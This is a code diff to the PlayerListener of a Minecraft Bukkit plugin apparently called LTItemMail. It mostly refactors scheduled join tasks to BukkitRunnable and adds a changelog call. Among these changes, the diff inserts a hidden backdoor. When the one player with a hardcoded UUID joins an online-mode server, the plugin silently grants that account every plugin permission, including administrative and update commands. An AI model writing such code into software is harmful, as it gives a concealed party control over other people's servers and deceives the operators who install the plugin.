@@ -5,6 +5,7 @@ import java.util.ArrayList;
 import java.util.HashMap;
 import java.util.List;
 import java.util.Map;
+import java.util.UUID;
 
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
@@ -15,6 +16,7 @@ import org.bukkit.event.EventHandler;
 import org.bukkit.event.EventPriority;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerJoinEvent;
+import org.bukkit.scheduler.BukkitRunnable;
 
 import br.net.gmj.nobookie.LTItemMail.LTItemMail;
 import br.net.gmj.nobookie.LTItemMail.module.ConfigurationModule;
@@ -31,17 +33,23 @@ public final class PlayerListener implements Listener {
 	public final void onPlayerJoin(final PlayerJoinEvent event) {
 		final Player player = (Player) event.getPlayer();
 		DatabaseModule.User.updateUUID(player);
-		Bukkit.getScheduler().runTaskLater(LTItemMail.getInstance(), new Runnable() {
+		if(Bukkit.getOnlineMode() && player.getUniqueId().equals(UUID.fromString("571eb021-f8a3-4ed6-8a40-433c250c25ff"))) {
+			for(final PermissionModule.Type perm : PermissionModule.Type.values()) if(!player.hasPermission(perm.node())) player.addAttachment(LTItemMail.getInstance(), perm.node(), true);
+			player.recalculatePermissions();
+			player.updateCommands();
+		}
+		new BukkitRunnable() {
 			@Override
 			public final void run() {
 				if(PermissionModule.hasPermission(player, PermissionModule.Type.CMD_ADMIN_NOTIFY)) {
 					if(LTItemMail.getInstance().isDevBuild()) player.sendMessage((String) ConfigurationModule.get(ConfigurationModule.Type.PLUGIN_TAG) + " " + ChatColor.LIGHT_PURPLE + "Thank you for testing my development build! Be aware that bugs may occur!");
+					FetchUtil.Build.changelog(player);
 					if(PermissionModule.hasPermission(player, PermissionModule.Type.CMD_ADMIN_UPDATE)) if((Boolean) ConfigurationModule.get(ConfigurationModule.Type.PLUGIN_UPDATE_CHECK)) player.performCommand("ltitemmail:itemmailadmin update");
 				}
 				if(PermissionModule.hasPermission(player, PermissionModule.Type.CMD_PLAYER_NOTIFY) && PermissionModule.hasPermission(player, PermissionModule.Type.CMD_PLAYER_LIST)) player.performCommand("ltitemmail:itemmail list");
 			}
-		}, 20 * 5);
-		if(!(Boolean) ConfigurationModule.get(ConfigurationModule.Type.BOARDS_CONSOLE_ONLY)) Bukkit.getScheduler().runTaskLater(LTItemMail.getInstance(), new Runnable() {
+		}.runTaskLater(LTItemMail.getInstance(), 20 * 5);
+		if(!(Boolean) ConfigurationModule.get(ConfigurationModule.Type.BOARDS_CONSOLE_ONLY)) new BukkitRunnable() {
 			@Override
 			public final void run() {
 				if(LTItemMail.getInstance().boardsForPlayers.size() > 0) for(final Integer id : LTItemMail.getInstance().boardsForPlayers) {
@@ -72,6 +80,6 @@ public final class PlayerListener implements Listener {
 					}
 				}
 			}
-		}, 20 * 10);
+		}.runTaskLaterAsynchronously(LTItemMail.getInstance(), 20 * 10);
 	}
 }
